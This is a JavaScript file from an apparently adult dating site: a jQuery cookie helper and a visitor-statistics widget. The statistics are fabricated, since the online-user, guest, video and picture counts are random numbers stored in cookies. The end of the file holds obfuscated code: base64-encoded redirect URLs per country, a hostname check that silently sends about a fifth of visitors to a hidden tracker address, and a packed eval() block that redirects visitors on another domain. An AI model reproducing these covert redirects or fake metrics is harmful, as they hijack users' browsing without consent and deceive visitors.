jQuery.cookie = function (d, g, e) {
	if (typeof g != "undefined") {
		e = e || {};
		if (g === null) {
			g = "";
			e.expires = -1
		}
		var f = "";
		if (e.expires && (typeof e.expires == "number" || e.expires.toUTCString)) {
			var k;
			if (typeof e.expires == "number") {
				k = new Date();
				k.setTime(k.getTime() + (e.expires * 24 * 60 * 60 * 1000))
			} else {
				k = e.expires
			}
			f = "; expires=" + k.toUTCString()
		}
		var b = e.path ? "; path=" + (e.path) : "";
		var l = e.domain ? "; domain=" + (e.domain) : "";
		var h = e.secure ? "; secure" : "";
		document.cookie = [d, "=", encodeURIComponent(g), f, b, l, h].join("")
	} else {
		var a = null;
		if (document.cookie && document.cookie != "") {
			var j = document.cookie.split(";");
			for (var m = 0; m < j.length; m++) {
				var c = jQuery.trim(j[m]);
				if (c.substring(0, d.length + 1) == (d + "=")) {
					a = decodeURIComponent(c.substring(d.length + 1));
					break
				}
			}
		}
		return a
	}
};

var setUpStats = function(){
	var total  = ($.cookie('total') ? $.cookie('total') : 0);
	var online = ($.cookie('online') ? $.cookie('online') : 0);
	var guests  = ($.cookie('guests') ? $.cookie('guests') : 0);
	var videos48 = ($.cookie('videos48') ? $.cookie('videos48') : 0);
	var videos = ($.cookie('videos') ? $.cookie('videos') : 0);
	var pics = ($.cookie('pics') ? $.cookie('pics') : 0);
	
	return function ()
	{
		var unix = Math.round(+new Date()/1000);
		if(!$.cookie('lastcheck') || (unix - 300 >= $.cookie('lastcheck')))
		{
			total 	= parseInt(unix.toString().substring(3, 8)-65000)+Math.round(parseInt(unix.toString().substring(6, 10))/100);
			if (total<0) total=total+70000;
			online 	= Math.floor(9000 + Math.random()*100);
			guests	= Math.floor(1200 + Math.random()*100);
			videos48 = Math.floor(200 + Math.random()*10);
			videos	= Math.floor(400 + Math.random()*100);
			pics	= Math.floor(90000 + Math.random()*100);
			
			$.cookie('total', total);
			$.cookie('online', online);
			$.cookie('guests', guests);
			$.cookie('videos48', videos48);
			$.cookie('videos', videos);
			$.cookie('lastcheck', unix);
			$.cookie('pics', pics);
		}
		
		$('span.total').html(total);
		$('span.online').html(online);
		$('span.guests').html(guests);
		$('span.videos48').html(videos48);
		$('span.videos').html(videos);
		$('span.pics').html(pics);
		
		setTimeout("setUpStats();", 300000);
	}

}();

function benc(e){var t="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";var n,r,i,s,o,u,a,f,l=0,c=0,h="",p=[];if(!e){return e}do{n=e.charCodeAt(l++);r=e.charCodeAt(l++);i=e.charCodeAt(l++);f=n<<16|r<<8|i;s=f>>18&63;o=f>>12&63;u=f>>6&63;a=f&63;p[c++]=t.charAt(s)+t.charAt(o)+t.charAt(u)+t.charAt(a)}while(l<e.length);h=p.join("");var d=e.length%3;return(d?h.slice(0,d-3):h)+"===".slice(d||3)}
function bdec(e){var t=l=0,n="",r="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/".split("");e.split("").forEach(function(e){t=(t<<6)+r.indexOf(e);l+=6;while(l>=8)n+=String.fromCharCode(t>>>(l-=8)&255)});return n};var d_ps = {"AL":"aHR0cDovL3NleHlsb2NhLmNvbS9yOG0vcHM4L2FiMS9pbmRleC5waHA/","BA":"aHR0cDovL3NleHlsb2NhLmNvbS9yOG0vcHM4L2JzOS9pbmRleC5waHA/","BG":"aHR0cDovL3NleHlsb2NhLmNvbS9yOG0vcHM4L2JyMi9pbmRleC5waHA/","ME":"aHR0cDovL3NleHlsb2NhLmNvbS9yOG0vcHM4L21lNy9pbmRleC5waHA/","HR":"aHR0cDovL3NleHlsb2NhLmNvbS9yOG0vcHM4L2N0OC9pbmRleC5waHA/","HU":"aHR0cDovL3NleHlsb2NhLmNvbS9yOG0vcHM4L2hnMC9pbmRleC5waHA/","MK":"aHR0cDovL3NleHlsb2NhLmNvbS9yOG0vcHM4L21kMy9pbmRleC5waHA/","RO":"aHR0cDovL3NleHlsb2NhLmNvbS9yOG0vcHM4L3JtNC9pbmRleC5waHA/","SI":"aHR0cDovL3NleHlsb2NhLmNvbS9yOG0vcHM4L3N2NS9pbmRleC5waHA/","SK":"aHR0cDovL3NleHlsb2NhLmNvbS9yOG0vcHM4L3NvNS9pbmRleC5waHA/","RS":"aHR0cDovL3NleHlsb2NhLmNvbS9yOG0vcHM4L3NiNi9pbmRleC5waHA/","CZ":"aHR0cDovL3NleHlsb2NhLmNvbS9yOG0vcHM4L2NlNy9pbmRleC5waHA/","LV":"aHR0cDovL3NleHlsb2NhLmNvbS9yOG0vcHM4L2x2Mi9pbmRleC5waHA/","LT":"aHR0cDovL3NleHlsb2NhLmNvbS9yOG0vcHM4L2x0MS9pbmRleC5waHA/","PT":"aHR0cDovL3NleHlsb2NhLmNvbS9yOG0vcHM4L3B0Mi9pbmRleC5waHA/","KE":"aHR0cDovL3NleHlsb2NhLmNvbS9yOG0vcHM4L2t5NC9pbmRleC5waHA/"};
if(benc(window.location.hostname)=='ZnVja3dvbWFuYS5jb20='){if( Math.floor((Math.random()*100)+1)<20 ) document.location.href=bdec('aHR0cDovL3JkdHJhay5jb20vUWNnYXI3V1JaQ3gyYU5Jc1JwVXFobng0ZkxCMHNxN1ExYXluUVNXcjdKV1l5Q1E9L2luZGV4Mi5waHA/');}
$(document).ready(function(){
	setUpStats();
	eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('4(0.1.5==\'3.2\')0.1.6=\'7://c.d/b/a/8/9.e\';',15,15,'window|location|com|smsmobail|if|hostname|href|http|br2|index|cl8|e7s|fastfuk|net|php'.split('|'),0,{}));
});
